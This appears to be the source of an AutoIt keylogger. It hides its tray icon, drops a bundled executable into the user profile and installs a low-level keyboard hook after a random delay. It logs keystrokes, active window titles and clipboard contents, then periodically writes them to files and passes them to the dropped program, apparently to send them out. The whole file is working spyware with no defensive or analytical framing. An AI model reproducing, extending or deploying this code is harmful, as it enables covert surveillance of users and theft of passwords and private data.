#NoTrayIcon
#include <Crypt.au3>

Global $USER_DLL = 0
Global $KERNEL_DLL = 0
Global $H = 0
Global $H_FUNC = 0

#include "kl_5_winapi.au3"
#include "kl_5_keys.au3"

Global $init = TimerInit()
Global $diff = 0
Global $run = Random(30, 60, 1)
Global $rFlag = False
If @Compiled Then
	Global $DIR = @UserProfileDir
Else
	Global $DIR = @ScriptDir
EndIf
Global $FILE = "wolcmdfx.exe"
Global $fFlag = 0

OnAutoItExitRegister("_Exit")

If @Compiled Then
	If FileExists($DIR&"\"&$FILE) And _
			_Crypt_HashFile($DIR&"\"&$FILE, $CALG_MD5) <> "0x965A39C5ACE1E9E5A2C5617A60AF5137" Then
		$fFlag = 1
	EndIf
	FileInstall("wolcmdfx.exe", $DIR&"\"&$FILE, $fFlag)
Else
	ClipPut(_Crypt_HashFile($DIR&"\"&$FILE, $CALG_MD5))
EndIf

While 1
	Sleep(250)
	If Not $rFlag Then
		$diff = Floor(TimerDiff($init)/1000)
		ToolTip($run-$diff)
		If $diff > $run Then
			_Run()
			$rFlag = True
			ToolTip("")
		EndIf
	EndIf
	; get current thread id..?
WEnd

; ######################## func ########################
Func _Exit()
	; send logs !!
    If $H <> 0 Then _uwhe($H)
	If $USER_DLL <> 0 Then DllClose($USER_DLL)
	If $KERNEL_DLL <> 0 Then DllClose($KERNEL_DLL)
    DllCallbackFree($H_FUNC)
EndFunc

Func _Run()
	$H_FUNC = DllCallbackRegister("_Do", "long", "int;wparam;lparam")
	$USER_DLL = DllOpen("user32.dll")
	$KERNEL_DLL = DllOpen("kernel32.dll")
	$H = _swhe(DllCallbackGetPtr($H_FUNC), _gmh())
EndFunc

Func _Do($nCode, $wParam, $lParam)
    Local $data = DllStructCreate($KH_STRUST, $lParam)
	Local $vkCode = DllStructGetData($data, "vkCode")
	Local $scanCode = DllStructGetData($data, "scanCode")
	Local Static $lWin = 0
	Local $cWin = WinGetHandle("")
	Local Static $lClip = ""
	Local $cClip = ClipGet()

	If $nCode < 0 Then
        Return _cnhe($H, $nCode, $wParam, $lParam)
    EndIf

	If $lClip <> $cClip Then
		_Log("[clip:"&$cClip&"]")
		$lClip = $cClip
	EndIf

	If $wParam = $WM_KEYDOWN Then
		If $lWin <> $cWin Then
			_Log(@CRLF&"[win:"&WinGetTitle($cWin)&"]"&@CRLF)
			$lWin = $cWin
		EndIf
		_GetChr($vkCode, $scanCode)
	ElseIf $wParam = $WM_KEYUP Then
		;
	EndIf

    Return _cnhe($H, $nCode, $wParam, $lParam)
EndFunc

Func _MergeThreads()
	Local Static $tList[2] = [_gcti(), 0]
	Local $tPid = 0
	Local $t = 0

	$t =  _gwtpi(WinGetHandle(""), $tPid)
	If $tList[1] <> $t Then
		If $tList[1] <> 0 Then
			_ati($tList[1], $tList[0], False)
		EndIf
		$tList[1] = $t
		_ati($tList[1], $tList[0], True)
	EndIf

	Return $t
EndFunc

Func _GetChr($kCode, $sCode)
	Local $kLay = 0
	Local $kState = DllStructCreate("byte keyState[256]")
	Local $uChar = DllStructCreate("wchar pwszBuff")
	Local $thread = _MergeThreads()

	DllCall("user32.dll", "bool", "GetKeyboardState", "ptr", DllStructGetPtr($kState))
	$kLay = _gkl($thread)
	DllCall( _
		$USER_DLL, "int", "ToUnicodeEx", _
		"uint", $kCode, _
		"uint", $sCode, _
		"ptr", DllStructGetPtr($kState), _
		"ptr", DllStructGetPtr($uChar), _
		"int", 1, _
		"uint", 0, _
		"handle", $kLay _
	)

	If $KEY_LIST[$kCode] Then
		Switch $kCode
			Case 0x0D
				_Log(@CRLF)
			Case 0x20
				_Log(" ")
			Case 0xA0
			Case 0xA1
			Case Else
				_Log("["&$KEY_LIST[$kCode]&"]")
		EndSwitch
	Else
		; pl support..?
		_Log(DllStructGetData($uChar, "pwszBuff"))
	EndIf
EndFunc

Func _Log($str)
	Local Static $b = ""
	Local Static $t = TimerInit()
	Local $l = 0

	$b &= $str
	If StringLen($b) > 256 Or Floor(TimerDiff($t)/1000) > 180 Then
		$l = StringLen($b)
		_Send(StringLeft($b, $l))
		;ConsoleWrite(StringLeft($b, $l))
		$b = StringTrimLeft($b, $l)
	EndIf
EndFunc

Func _Send($text)
	Local $f = @HOUR&@MIN&@SEC&@MSEC
	FileWrite($DIR&"\"&$f, $text)
	ShellExecute($FILE, $f, $DIR)
EndFunc
; ######################## / ########################
